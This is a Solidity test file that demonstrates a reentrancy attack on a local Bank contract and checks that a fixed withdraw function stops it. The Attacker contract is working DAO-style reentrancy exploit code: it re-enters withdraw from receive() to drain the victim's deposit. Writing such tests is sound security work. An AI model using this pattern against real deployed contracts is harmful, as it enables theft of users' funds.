// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Bank} from "src/Bank.sol";

// Minimal hevm cheatcode interface (avoids a forge-std dependency).
interface Vm {
    function deal(address, uint256) external;
    function prank(address) external;
}

// DAO-class attacker: receive() re-calls the target while the bank still holds funds.  Low-level call, failure
// tolerated, so a reverted reentry (the F case) does not unwind the whole attack — the attacker just fails to
// drain.  A shared `useV` flag selects withdraw_V vs withdraw_F so ONE attacker exercises both.
contract Attacker {
    Bank public bank;
    bool public useV;
    uint256 public reentries;
    uint256 public maxDepth; // reentry-depth watermark (for the trace)

    constructor(Bank _bank) { bank = _bank; }

    // Non-payable: the attacker deposits from its OWN (pre-funded) balance, so final balance vs the 1-ether
    // stake is a clean profit measure.
    function attack(bool _useV) external {
        useV = _useV;
        reentries = 0;
        maxDepth = 0;
        bank.deposit{value: 1 ether}();
        if (_useV) bank.withdraw_V(); else bank.withdraw_F();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            reentries += 1;
            if (reentries > maxDepth) maxDepth = reentries;
            bytes memory sig = useV
                ? abi.encodeWithSignature("withdraw_V()")
                : abi.encodeWithSignature("withdraw_F()");
            (bool ok, ) = address(bank).call(sig);   // reentry; failure tolerated
            ok;
        }
    }
}

contract ReentrancyTest {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Bank bank;

    event Trace(string what, uint256 value);

    function setUp() public {
        bank = new Bank();
        address victim = address(0x1C71); // "victim" deposits the pool the attacker will try to drain
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bank.deposit{value: 1 ether}();
        require(address(bank).balance == 1 ether, "setup");
    }

    // V (vulnerable): attacker deposits 1, drains 2 -> net +1 (the victim's ether); bank emptied.
    function test_V_drains() public {
        Attacker att = new Attacker(bank);
        vm.deal(address(att), 1 ether);
        att.attack(true);

        emit Trace("V attacker reentries", att.reentries());
        emit Trace("V attacker final balance", address(att).balance);
        emit Trace("V bank final balance", address(bank).balance);
        require(address(att).balance > 1 ether, "V should let attacker profit (drain)");
        require(address(bank).balance == 0, "V should empty the bank");
    }

    // F (fixed): the reentry finds balances[attacker]==0 and reverts; attacker cannot profit; victim safe.
    function test_F_safe() public {
        Attacker att = new Attacker(bank);
        vm.deal(address(att), 1 ether);
        att.attack(false);

        emit Trace("F attacker reentries", att.reentries());
        emit Trace("F attacker final balance", address(att).balance);
        emit Trace("F bank final balance", address(bank).balance);
        require(address(att).balance <= 1 ether, "F must not let attacker profit");
        require(address(bank).balance == 1 ether, "F must preserve the victim's ether");
    }
}
